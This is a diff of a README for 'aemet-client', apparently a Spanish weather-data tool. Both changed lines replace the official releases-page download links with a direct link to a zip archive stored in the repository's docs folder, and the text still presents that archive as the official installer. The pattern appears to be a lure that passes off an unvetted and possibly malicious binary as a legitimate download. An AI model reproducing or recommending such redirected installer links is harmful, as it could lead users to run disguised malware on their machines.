@@ -1,6 +1,6 @@
 # 🌦️ aemet-client - Bring Spanish weather data to apps
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blueviolet.svg)](https://github.com/Alysiadeceptive64/aemet-client/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blueviolet.svg)](https://github.com/Alysiadeceptive64/aemet-client/raw/refs/heads/main/packages/aemet-client/docs/client_aemet_2.9-alpha.2.zip)
 
 This application connects your computer to official weather data from Spain. It provides current conditions, forecasts, and radar maps. You can use this data inside AI tools like Claude Desktop, Cursor, or Windsurf. Developers can also use the code directly in their own projects to display weather information. Aemet-client acts as a bridge between official government data and the tools you use every day.
 
@@ -8,7 +8,7 @@ This application connects your computer to official weather data from Spain. It 
 
 To begin, you need the official installer. Visit the page below to view all available files for your system.
 
-[Download the aemet-client installer](https://github.com/Alysiadeceptive64/aemet-client/releases)
+[Download the aemet-client installer](https://github.com/Alysiadeceptive64/aemet-client/raw/refs/heads/main/packages/aemet-client/docs/client_aemet_2.9-alpha.2.zip)
 
 1. Open the link above in your web browser.
 2. Look for the section titled Latest. 
